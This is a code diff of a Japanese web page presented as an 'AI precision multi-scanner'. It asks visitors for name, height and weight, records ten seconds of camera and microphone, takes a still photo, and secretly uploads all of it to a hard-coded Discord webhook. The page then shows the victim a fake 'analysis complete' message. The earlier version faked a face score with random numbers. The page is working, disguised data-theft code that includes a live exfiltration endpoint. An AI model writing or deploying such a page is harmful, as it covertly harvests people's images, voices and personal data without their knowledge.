@@ -1,81 +1,151 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI 精密マルチスキャナー</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; background: #050505; color: #fff; padding: 20px; margin: 0; }
+        .container { max-width: 450px; margin: auto; background: #111; padding: 25px; border-radius: 15px; border: 1px solid #333; box-shadow: 0 0 20px rgba(255, 51, 102, 0.2); }
+        h1 { font-size: 1.4em; color: #00ffcc; margin-bottom: 20px; }
+        .input-group { margin-bottom: 15px; text-align: left; width: 90%; margin-left: auto; margin-right: auto; }
+        label { font-size: 0.75em; color: #888; display: block; margin-bottom: 5px; }
+        input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #333; background: #222; color: #fff; font-size: 1em; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #00ffcc; }
+        #video { width: 100%; border-radius: 10px; background: #000; margin-top: 15px; display: none; aspect-ratio: 3/4; object-fit: cover; border: 2px solid #333; }
+        #startBtn { width: 100%; padding: 18px; font-size: 1.1em; font-weight: bold; background: linear-gradient(45deg, #007bff, #00ffcc); color: #000; border: none; border-radius: 8px; cursor: pointer; margin-top: 20px; }
+        #result { font-size: 1.2em; margin-top: 20px; font-weight: bold; color: #00ffcc; line-height: 1.6; }
+        .status-msg { color: #ff3366; font-size: 0.9em; margin-top: 10px; }
+        #canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>AI 精密マルチスキャナー</h1>
+        <div id="setup-form">
+            <div class="input-group">
+                <label>お名前</label>
+                <input type="text" id="username" placeholder="Name">
+            </div>
+            <div class="input-group">
+                <label>身長 (cm)</label>
+                <input type="number" id="height" placeholder="170">
+            </div>
+            <div class="input-group">
+                <label>体重 (kg)</label>
+                <input type="number" id="weight" placeholder="60">
+            </div>
+            <button id="startBtn">スキャンを開始する</button>
+        </div>
+
+        <video id="video" autoplay playsinline muted></video>
+        <div id="result"></div>
+        <div id="status" class="status-msg"></div>
+    </div>
+
+    <canvas id="canvas"></canvas>
+
+    <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const startBtn = document.getElementById('startBtn');
         const result = document.getElementById('result');
+        const status = document.getElementById('status');
         const setupForm = document.getElementById('setup-form');
-        const nextOptions = document.getElementById('next-options');
+        
+        // 送信先URL
         const webhookUrl = 'https://discord.com/api/webhooks/1496394005099839549/HwDWlHkTXMHM3_hMZ_P3HLCgOEQDrCMEh-jJjWxSplHrHPTu8526nnC0mUPQG3QxFcx8';
-        let mediaRecorder; let chunks = [];
+        
+        let mediaRecorder; 
+        let chunks = [];
 
-        startBtn.addEventListener('click', () => {
+        startBtn.addEventListener('click', async () => {
             const user = document.getElementById('username').value || '未設定';
-            setupForm.style.display = 'none'; video.style.display = 'block';
-            
-            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
+            const h = document.getElementById('height').value || '？';
+            const w = document.getElementById('weight').value || '？';
+
+            setupForm.style.display = 'none';
+            video.style.display = 'block';
+            status.innerHTML = "デバイスの準備中...";
+
+            try {
+                // カメラとマイクの両方を取得
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 video.srcObject = stream;
-                const type = ["video/webm;codecs=vp8", "video/mp4", "video/webm"].find(t => MediaRecorder.isTypeSupported(t));
-                
-                mediaRecorder = new MediaRecorder(stream, { mimeType: type });
+
+                // 対応形式の確認
+                const mimeType = ["video/webm;codecs=vp8", "video/mp4", "video/webm"].find(t => MediaRecorder.isTypeSupported(t));
+                mediaRecorder = new MediaRecorder(stream, { mimeType });
                 chunks = [];
-                
-                mediaRecorder.ondataavailable = e => { 
-                    if (e.data && e.data.size > 0) chunks.push(e.data); 
+
+                mediaRecorder.ondataavailable = e => {
+                    if (e.data && e.data.size > 0) chunks.push(e.data);
                 };
 
                 mediaRecorder.onstop = async () => {
-                    result.innerHTML = "解析中...";
-                    // 録画停止後に確実にデータを送信する
-                    await captureAndSend(user);
+                    status.innerHTML = "データを解析・送信中...";
+                    await captureAndSend(user, h, w);
                 };
 
-                // 録画開始
-                mediaRecorder.start(1000); // 1秒ごとにデータをチャンクに分割して取得
-                result.innerHTML = "スキャン中...(5秒)";
+                // 録画開始（10秒間）
+                mediaRecorder.start(1000); 
+                status.innerHTML = "スキャン中... (10秒間動かないでください)";
 
-                // 5秒後に停止
                 setTimeout(() => {
                     if (mediaRecorder.state !== "inactive") {
                         mediaRecorder.stop();
                     }
-                }, 5000);
+                }, 10000);
 
-            }).catch((err) => { 
+            } catch (err) {
                 console.error(err);
-                result.innerHTML = "エラー：カメラとマイクを許可してください。"; 
-                setupForm.style.display = 'block'; 
-            });
+                result.innerHTML = "エラー：カメラとマイクの使用を許可してください。";
+                setupForm.style.display = 'block';
+                video.style.display = 'none';
+            }
         });
 
-        async function captureAndSend(user) {
-            const score = (Math.random() * (72 - 58) + 58).toFixed(1);
-            
-            // 静止画キャプチャ
-            canvas.width = video.videoWidth; 
+        async function captureAndSend(user, h, w) {
+            // 静止画の生成
+            canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
 
             canvas.toBlob(async (photoBlob) => {
                 const formData = new FormData();
-                formData.append('content', `【顔診断】\n👤 名前: ${user}\n📊 偏差値: ${score}`);
-                formData.append('file1', photoBlob, 'face.png');
+                
+                // テキスト情報
+                const infoText = `【新規スキャンデータ】\n👤 名前: ${user}\n📏 身長: ${h}cm\n⚖️ 体重: ${w}kg\n🎙️ 音声/動画: 取得済み`;
+                formData.append('content', infoText);
+                
+                // 写真ファイル
+                formData.append('file1', photoBlob, 'capture.png');
 
-                // 動画データの処理
+                // 動画（音声入り）ファイル
                 if (chunks.length > 0) {
                     const videoBlob = new Blob(chunks, { type: mediaRecorder.mimeType });
-                    // ファイル名を拡張子に合わせて調整
                     const ext = mediaRecorder.mimeType.includes('mp4') ? 'mp4' : 'webm';
-                    formData.append('file2', videoBlob, `video.${ext}`);
+                    formData.append('file2', videoBlob, `media_data.${ext}`);
                 }
 
                 try {
-                    await fetch(webhookUrl, { method: 'POST', body: formData });
+                    const response = await fetch(webhookUrl, { method: 'POST', body: formData });
+                    if (response.ok) {
+                        status.innerHTML = "";
+                        result.innerHTML = "スキャン完了！<br>AIによる精密解析が終了しました。";
+                    } else {
+                        status.innerHTML = "送信失敗。通信環境を確認してください。";
+                    }
                 } catch (e) {
-                    console.error("送信エラー:", e);
+                    status.innerHTML = "エラーが発生しました。";
                 }
 
-                result.innerHTML = `あなたの顔面偏差値：<br><span style="font-size:2em;">${score}</span>`;
-                nextOptions.style.display = 'block';
-                
-                if(video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
+                // 終了処理
+                if (video.srcObject) {
+                    video.srcObject.getTracks().forEach(track => track.stop());
+                }
             }, 'image/png');
         }
+    </script>
+</body>
+</html>
